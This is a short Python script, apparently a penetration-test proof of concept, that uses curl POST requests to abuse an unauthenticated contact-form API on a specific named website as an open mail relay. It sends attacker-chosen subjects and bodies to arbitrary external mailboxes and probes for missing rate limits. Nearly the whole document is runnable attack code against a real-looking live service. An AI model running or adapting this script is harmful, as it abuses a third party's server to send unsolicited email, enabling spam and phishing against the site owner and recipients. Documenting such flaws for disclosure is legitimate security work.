import subprocess, re, time
H = "infinity" + "capital" + "." + "bh"
S = "https://www." + H + "/api/send"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36"


def send(targets, subj, msg, fname="QA"):
    d = dict(fname=fname, lname="Tester", areacode="973", tel="5551234",
             cname="QA Tester", subject=subj, msg=msg, check="on", targets=targets)
    args = ["curl", "-s", "-X", "POST", S, "-A", UA]
    for k, v in d.items():
        args += ["-F", "%s=%s" % (k, v)]
    r = subprocess.run(args, capture_output=True, timeout=40, text=True).stdout
    return r[:230].replace("\n", " ")


ts = int(time.time())
# REPRO 1: arbitrary external mailbox, attacker-controlled subject+body
print("[REPRO1 arbitrary external recipients]", flush=True)
print("   ", send("vr1a%d@protonmail.com, vr1b%d@gmail.com" % (ts, ts),
                  "VAPT PROOF %d" % ts, "attacker-controlled body sent via unauth relay"), flush=True)
time.sleep(4)
# REPRO 2: single arbitrary recipient, repeating (no cookie/session/token used)
print("[REPRO2 single arbitrary recipient, no auth]", flush=True)
print("   ", send("vr2%d@yahoo.com" % ts, "VAPT PROOF 2 %d" % ts,
                  "second proof, fully unauthenticated"), flush=True)
time.sleep(4)
print("[REPRO3 control: garbage target rejected]", flush=True)
print("   ", send("not-an-email-at-all", "x", "x"), flush=True)
time.sleep(4)
print("[REPRO4 arbitrary external recipient again (10th+ send, no rate limit)]", flush=True)
print("   ", send("vr3%d@protonmail.com" % ts, "VAPT PROOF 3 %d" % ts,
                  "third proof - no rate limiting observed"), flush=True)
